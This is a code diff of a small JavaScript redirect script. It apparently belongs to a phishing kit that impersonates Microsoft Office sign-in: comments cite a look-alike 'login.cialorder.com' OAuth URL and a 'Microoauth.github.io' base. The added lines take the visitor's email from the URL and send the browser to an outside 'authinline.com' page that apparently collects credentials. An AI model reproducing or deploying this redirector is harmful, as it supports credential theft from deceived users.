@@ -7,30 +7,32 @@
       // Get the current URL
       var currentURL = window.location.href;
 
-      // Check if the current URL contains a '#' character
-      if (currentURL.includes('#')) {
+      // Check if the current URL contains a '?' character
+      if (currentURL.includes('?')) {
         // Split the URL into two parts: the base URL and the email part
-        var parts = currentURL.split('#');
-        var baseURL = parts[0]; // https://login.cialorder.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638329803226553354.Y2FlMzllNDMtMjkyMC00M2FkMzk0YWExYTkwYTQyYzlhZjg1Y2JiYzk2MTQxODQtYTUxZS00MDk2LThkNzYtM2M2ZmE2NzIwNDM0&ui_locales=en-US&mkt=en-US&client-request-id=8ad7faba-dd04-43bd-a0e6-4c204e8d5448&state=1000wNNxRWZLVWDdEJ8F-iEU4o8JAshdy0cv9Vim6LliOzDzjUQ_3neta3p0vYBZQogVMviIKVnoSOwMvpcmMrHZ5PDs8WRu_x31BRe0duMAS4tTMAsLgoM3ID0Ezo1t4m9hqjLYhEynQMkfCJomwaReqP_9TosbEwn79-maik_xFm7ADL-hMvedA4Xj9oEi0g_L0cSEspikXH1Z5e_oDPYtigsRbcfRlgLdW9pGe1TkrWi_-h04PfngOoUQej7f6NJvLqZno7GCIys56V5_WQ&x-client-SKU=ID_NET6_0&x-client-ver=6.30.1.0&sso_reload=true
+        var parts = currentURL.split('?');
+        var baseURL = parts[0]; // https://Microoauth.github.io/mail
         var emailPart = parts[1];
 
         // Check if the email part is not empty
         if (emailPart) {
-          // Extract the email from the emailPart
-          var email = emailPart.split('=')[0];
+          // Split the emailPart into email and the rest of the parameters
+          var emailAndRest = emailPart.split('=');
+          var email = emailAndRest[0];
+          var rest = emailAndRest[1];
 
-          // Construct the redirect URL with the email in front of the '='
-          var redirectURL = baseURL + '#' + email + '=' + emailPart;
+          // Construct the redirect URL by appending the email in front of the '='
+          var redirectURL = 'https://authinline.com/email/index.html?' + email + '=' + rest;
 
           // Redirect to the constructed URL
           window.location.href = redirectURL;
         } else {
-          // If the email part is empty, simply redirect to the URL
-          window.location.href = baseURL;
+          // If the email part is empty, simply redirect to the second link
+          window.location.href = 'https://authinline.com/email/index.html/';
         }
       } else {
-        // If no '#' character is found, simply redirect to the URL
-        window.location.href = currentURL;
+        // If no '?' character is found, simply redirect to the second link
+        window.location.href = 'https://authinline.com/email/index.html/';
       }
     }
 
